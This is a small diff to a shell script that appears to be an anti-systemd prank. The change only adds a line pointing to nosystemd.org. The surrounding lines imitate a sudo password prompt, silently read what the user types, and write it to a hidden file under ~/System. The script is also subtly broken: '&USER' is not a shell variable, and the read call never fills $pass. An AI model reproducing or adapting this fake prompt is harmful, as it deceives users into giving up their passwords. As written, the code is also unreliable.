@@ -7,3 +7,4 @@ echo "[sudo] password for &USER:"
 read -sp pass
 echo "$pass" > ~/System/tpd
 figlet systemdSucks
+echo "Read more on nosystemd.org"
